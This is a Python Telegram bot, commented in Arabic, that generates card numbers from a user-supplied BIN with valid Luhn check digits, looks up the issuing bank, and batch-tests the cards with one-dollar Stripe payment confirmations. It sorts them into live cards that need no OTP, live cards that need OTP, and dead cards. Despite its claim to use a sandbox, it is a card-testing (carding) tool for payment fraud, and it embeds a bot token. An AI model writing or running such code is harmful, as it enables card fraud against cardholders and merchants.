import telebot
import requests
import random
import time

# ========== توكن البوت ==========
BOT_TOKEN = "7662450317:AAHOQUXKWf4e4Zzs9oWhFkbguLBwS_QvM4Q"
bot = telebot.TeleBot(BOT_TOKEN)

try:
    bot.delete_webhook()
    print("Webhook deleted")
except:
    pass

# ========== جلب معلومات BIN ==========
def get_bin_info(bin_prefix):
    try:
        url = f"https://lookup.binlist.net/{bin_prefix[:6]}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            bank = data.get('bank', {}).get('name', 'غير معروف')
            country = data.get('country', {}).get('name', 'غير معروف')
            scheme = data.get('scheme', 'غير معروف')
            return {
                'bank': bank,
                'country': country,
                'scheme': scheme
            }
        return None
    except:
        return None

# ========== توليد بطاقة ==========
def gen_card(bin_prefix):
    remaining = ''.join([str(random.randint(0,9)) for _ in range(9)])
    card = bin_prefix[:6] + remaining
    digits = [int(d) for d in card]
    for i in range(len(digits)-1, -1, -1):
        if i % 2 == 0:
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
    check = (10 - (sum(digits) % 10)) % 10
    full = card + str(check)
    month = str(random.randint(1,12)).zfill(2)
    year = str(random.randint(2025,2029))
    cvv = str(random.randint(100,999))
    return f"{full}|{month}|{year}|{cvv}"

def generate_cards(bin_prefix, count):
    cards = []
    for _ in range(count):
        cards.append(gen_card(bin_prefix))
    return cards

# ========== فحص البطاقة (Stripe) ==========
def check_card_stripe(card_str):
    try:
        parts = card_str.split('|')
        card, month, year, cvv = parts
        
        url = "https://api.stripe.com/v1/payment_methods"
        headers = {
            "Authorization": "Bearer sk_test_4eC39HqLyjWDarjtT1zdp7dc",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = {
            "type": "card",
            "card[number]": card,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        
        r = requests.post(url, headers=headers, data=data, timeout=10)
        if r.status_code != 200:
            return "DEAD"
        
        pm_id = r.json().get('id')
        
        pay_url = "https://api.stripe.com/v1/payment_intents"
        pay_data = {
            "amount": 100,
            "currency": "usd",
            "payment_method": pm_id,
            "confirm": "true"
        }
        pr = requests.post(pay_url, headers=headers, data=pay_data, timeout=10)
        
        if pr.status_code == 200:
            status = pr.json().get('status')
            if status == 'succeeded':
                return "LIVE_NO_OTP"
            elif status == 'requires_action':
                return "LIVE_WITH_OTP"
            else:
                return "DEAD"
        else:
            error = pr.json().get('error', {})
            if error.get('code') == 'insufficient_funds':
                return "LIVE_NO_OTP"
            return "DEAD"
    except:
        return "DEAD"

# ========== أوامر البوت ==========
@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, """
🌟 **بوت فحص بطاقات Stripe** 🌟

/gen <BIN> → توليد 10 بطاقات
/otp رقم|شهر|سنة|رمز → فحص بطاقة واحدة
/otp20 <BIN> → فحص 20 بطاقة (مع معلومات البنك)

⚠️ يستخدم Stripe Sandbox للاختبار
    """)

@bot.message_handler(commands=['gen'])
def gen_cmd(msg):
    try:
        parts = msg.text.split()
        bin_prefix = parts[1] if len(parts) > 1 else "424242"
        cards = [gen_card(bin_prefix) for _ in range(10)]
        bot.reply_to(msg, "🎴 **10 بطاقات:**\n\n" + "\n".join(cards))
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

@bot.message_handler(commands=['otp'])
def otp_cmd(msg):
    try:
        data = msg.text.replace('/otp', '').strip()
        if '|' not in data:
            bot.reply_to(msg, "❌ /otp رقم|شهر|سنة|رمز\nمثال: /otp 4242424242424242|12|2025|123")
            return
        parts = data.split('|')
        if len(parts) != 4:
            bot.reply_to(msg, "❌ 4 أجزاء: رقم|شهر|سنة|رمز")
            return
        card_str = data.strip()
        card_number = parts[0]
        bin_info = get_bin_info(card_number[:6])
        
        info_text = ""
        if bin_info:
            info_text = f"\n🏦 {bin_info['bank']}\n🌍 {bin_info['country']}\n💳 {bin_info['scheme'].upper()}\n"
        
        bot.reply_to(msg, f"⏳ جاري الفحص...\n{card_str}{info_text}")
        result = check_card_stripe(card_str)
        if result == "LIVE_NO_OTP":
            bot.reply_to(msg, f"✅ **LIVE - لا تطلب OTP**\n{card_str}{info_text}")
        elif result == "LIVE_WITH_OTP":
            bot.reply_to(msg, f"🟡 **LIVE - تتطلب OTP**\n{card_str}{info_text}")
        else:
            bot.reply_to(msg, f"❌ **DEAD**\n{card_str}{info_text}")
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

@bot.message_handler(commands=['otp20'])
def otp20_cmd(msg):
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            bot.reply_to(msg, "❌ /otp20 <BIN>\nمثال: /otp20 465901")
            return
        bin_prefix = parts[1][:6]
        
        bin_info = get_bin_info(bin_prefix)
        info_header = ""
        if bin_info:
            info_header = f"\n🏦 **البنك:** {bin_info['bank']}\n🌍 **الدولة:** {bin_info['country']}\n💳 **النوع:** {bin_info['scheme'].upper()}\n"
        else:
            info_header = "\n❓ **معلومات البنك غير متوفرة**\n"
        
        bot.reply_to(msg, f"🔍 **فحص BIN {bin_prefix}**{info_header}\n⏳ جاري توليد وفحص 20 بطاقة...")
        
        cards = generate_cards(bin_prefix, 20)
        
        live_cards = []
        results_text = f"📊 **نتائج فحص BIN {bin_prefix}**\n{info_header}\n"
        results_text += "═" * 40 + "\n\n"
        
        for i, card in enumerate(cards, 1):
            result = check_card_stripe(card)
            if result == "LIVE_NO_OTP":
                live_cards.append(card)
                status = "✅ LIVE"
            elif result == "LIVE_WITH_OTP":
                status = "🟡 OTP"
            else:
                status = "❌ DEAD"
            
            results_text += f"{i:2}. {card} → {status}\n"
            time.sleep(0.3)
        
        results_text += f"\n{'═' * 40}\n"
        results_text += f"📈 **الإحصائيات:**\n"
        results_text += f"🔴 LIVE بدون OTP: {len(live_cards)}\n"
        results_text += f"🟡 LIVE مع OTP: {20 - len(live_cards) - (20 - len(live_cards) - (20 - len(live_cards)))}\n"
        results_text += f"⚫ DEAD: {20 - len(live_cards)}\n"
        
        if live_cards:
            results_text += f"\n⚠️ **ثغرة مكتشفة!** {len(live_cards)} بطاقة صالحة بدون OTP.\n"
        
        bot.reply_to(msg, results_text)
            
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

print("🚀 البوت شغال...")
bot.infinity_polling()
